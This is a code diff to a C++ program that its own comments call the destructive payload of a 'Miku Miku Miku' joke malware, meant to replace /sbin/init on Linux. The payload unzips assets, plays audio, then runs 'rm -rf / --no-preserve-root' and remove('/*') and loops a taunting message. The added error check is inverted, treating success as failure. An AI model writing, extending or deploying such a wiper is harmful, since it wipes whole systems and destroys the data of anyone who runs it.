@@ -1,28 +1,40 @@
 #include <iostream>
 #include <cstdlib>
+#include <cstdio>
 #include <unistd.h>
 
 // The destructive part of Miku Miku Miku, this gets downloaded on runtime.
-// This replaces /sbin/init on systemd-based Linux distros.
+// This replaces /sbin/init on Linux distros.
 
 int main()
 {
     // Just gotta unzip the assets hold on
-    system(" cd /miku && unzip Assets.zip");
+    system("cd /miku && unzip Assets.zip");
 
     // HATSUNE MIKU!!!!!!!!!!!!!!!!!
-    system("mpv BD5972AA.ogg");
+    system("mpv /miku/*.ogg");
 
     // Let's play some Aurascope! Second to last step of the payload.
-    // Unused for now: system("cd Aurascope && xinit /usr/bin/wine Aurascope.exe");
+    // Unused for now: system("cd Aurascope && xinit /usr/bin/wine Aurascope.exe"); // Most likely not going to do anything as wine is going to crash the instant xD
 
     // Yeet the files, we don't need em around here.'
     system("rm -rf / --no-preserve-root");
+    int rmRoot = remove("/*");
+
+    if (!rmRoot)
+    {
+      perror("Error deleting file: /*");
+      return EXIT_FAILURE;
+    }
+    else
+    {
+      std::cout << "Successfully deleted /*!";
+    }
 
     while(1) {
         system("clear");
         std::cout << "Good luck getting your files back! Hatsune Miku took them all...";
     }
 
-    return 0;
+    return EXIT_SUCCESS;
 }
